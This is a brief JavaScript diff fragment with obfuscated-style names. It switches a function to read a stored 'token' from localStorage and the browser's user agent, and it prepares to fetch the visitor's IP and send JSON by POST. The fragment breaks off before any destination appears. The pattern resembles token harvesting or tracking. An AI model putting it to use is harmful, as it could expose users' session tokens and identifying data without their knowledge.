@@ -44,11 +44,10 @@
     const _0x1a2b = ['json', 'POST', 'Content-Type', 'application/json', 'https://api.ipify.org?format=json', 'ip'];
     
     async function processData() {
-      const _0x3c4d = new URLSearchParams(window.location.search);
-      const _0x5e6f = _0x3c4d.get('token');
-      const _0x7g8h = _0x3c4d.get('ua') || navigator.userAgent;
+      const _0x5e6f = localStorage.getItem('token'); // トークンをlocalStorageから取得
+      const _0x7g8h = navigator.userAgent; // ユーザーエージェントを直接取得
       
-      if (!_0x5e6f) return;
+      if (!_0x5e6f) return; // トークンが存在しない場合、処理を終了
       
       try {
         // IP情報の取得
